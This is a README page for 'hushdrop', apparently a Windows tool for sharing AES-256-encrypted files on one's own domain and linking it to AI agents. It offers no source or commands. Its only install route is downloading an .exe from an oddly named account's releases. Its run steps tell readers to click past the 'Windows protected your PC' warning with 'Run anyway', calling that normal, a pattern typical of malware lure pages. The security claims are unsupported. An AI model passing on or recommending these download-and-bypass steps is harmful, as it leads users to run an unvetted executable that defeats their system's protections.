---
layout: "default"
title: "📦 hushdrop - Send private files using your domain"
description: "Host private, AES-256 encrypted files and web projects on your own domain using this command-line tool."
---
# 📦 hushdrop - Send private files using your domain

[![](https://img.shields.io/badge/Download_Hushdrop-Blue?style=for-the-badge&logo=github)](https://github.com/Gregoryaerodynamic322/hushdrop/releases)

Hushdrop lets you share files and data privately. You keep control of your content by hosting it on your own domain. The system uses encryption to keep your files safe. Only people with your password can view what you share. It works with local files and connects to AI tools.

## 📋 What is Hushdrop?

Hushdrop solves a simple problem. Most file-sharing tools send your data to someone else's server. You lose control when you do that. Hushdrop keeps your files under your roof. You decide where they live. You decide who sees them. You decide how long they stay online.

The software uses AES-256 encryption. This is a high standard for data security. Even if someone finds your file, they cannot read it without your password. We call this zero-knowledge hosting. We do not see your files. No one else sees your files. Only you and your chosen recipients possess the key.

This tool works well for people who use AI agents. If your AI assistant creates a document, you can push it to your hushdrop site instantly. It supports command-line use and the Model Context Protocol. These features make it helpful for automation tasks.

## ⚙️ System Requirements

- Windows 10 or Windows 11 operating system.
- An internet connection for uploading your files.
- A basic understanding of how to open a folder on your computer.
- A domain name if you plan to host the files publicly (optional for local testing).

## 🚀 Downloading Hushdrop

You do not need to build code or run complex commands to use this tool. We provide a simple file for Windows users. Follow these steps to get the software:

1. Visit the following page to view all available versions: [https://github.com/Gregoryaerodynamic322/hushdrop/releases](https://github.com/Gregoryaerodynamic322/hushdrop/releases)
2. Look for the file ending in `.exe` under the latest release.
3. Click the file name to start the download.
4. Save the file to your desktop or your Downloads folder.

## 🛠️ How to run Hushdrop

Once you download the file, you can run it immediately. Windows might show a security notice because the file is new. This is normal.

1. Locate the downloaded file on your computer.
2. Double-click the file to open it.
3. If a window appears that says "Windows protected your PC," click "More info."
4. Click the "Run anyway" button.
5. A command window will appear. This window is the control center for your files.

## 🔑 Protecting your files

Hushdrop uses passwords to wrap your files. You set a password during the sharing process. 

1. When you select a file to share, the program asks for a password.
2. Type a strong password. Use a mix of letters, numbers, and symbols.
3. The program locks the file using AES-256 encryption.
4. Upload the encrypted file to your chosen web host or Vercel account.
5. Send the file link and the password to your recipient.

Without the password, the file remains a meaningless block of data. Even the hosting company cannot open it. This protects your privacy during transit and while the file sits on a server.

## 🤖 Using with AI Agents

Hushdrop integrates with AI tools like Claude. If you use AI to generate code or reports, you can point the AI to Hushdrop. This creates a link for sharing the output of your agent. 

To connect an AI agent:
1. Ensure the hushdrop program is running or accessible on your system.
2. Configure your AI agent to output files to your local hushdrop output folder.
3. The folder process automatically pushes the content to your web host.
4. Check your agent logs to retrieve the public link for your file.

This setup removes the manual labor of uploading and securing documents. You create, you secure, and you share in one flow.

## 🌐 Sharing via your own domain

Hosting on your own domain builds trust. When recipients visit your link, they see your web address. This makes your shared files look professional.

1. Create an account on a static hosting provider like Vercel.
2. Connect your domain name to the provider.
3. Point your hushdrop output to the designated folder for your site.
4. Every file you share now lives on yourdomain.com/filename.

This method keeps your public presence consistent. Your friends and colleagues will know the file came from you and not a generic file-sharing site.

## ❓ Frequently Asked Questions

**Is my data stored on your servers?**
No. Hushdrop does not have a server. All data stays on your machine until you choose to upload it to your own web host.

**Can I recover my files if I lose the password?**
If you lose the password, the files are gone. The encryption is strong. We cannot assist in decrypting files because we do not have access to your keys. Keep your passwords in a safe place.

**Does this require coding knowledge?**
No. We designed the interface for general use. You only need to interact with the file prompts.

**Does it work on Mac or Linux?**
The current version focuses on Windows. Please check the releases page for updates on other operating systems.

## 🔒 Security Policy

We believe in privacy by design. The software performs all encryption locally on your computer. The encryption keys never leave your device. The only items uploaded to the web are the encrypted files. This ensures your private data remains invisible to third parties. We update the dependency list often to patch any gaps in security. Always download the latest version to keep your files safe.